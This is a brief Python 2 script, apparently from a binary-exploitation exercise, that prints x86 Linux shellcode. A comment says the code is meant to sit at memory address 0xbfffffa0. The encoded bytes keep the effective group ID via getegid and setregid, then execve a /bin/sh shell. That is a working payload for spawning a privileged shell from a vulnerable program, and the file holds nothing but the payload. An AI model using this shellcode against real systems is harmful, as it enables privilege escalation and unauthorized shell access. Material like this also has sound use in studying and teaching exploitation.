#!/usr/bin/env python2

# we make the shell_code to stay at the top of the memory
# layout at `0xbfffffa0`
shell_code = ("\x6a\x32\x58\xcd\x80\x89\xc3\x89\xc1\x6a" +
             "\x47\x58\xcd\x80\x31\xc0\x50\x68\x2f\x2f" +
             "\x73\x68\x68\x2f\x62\x69\x6e\x54\x5b\x50" +
             "\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80")
print(shell_code)
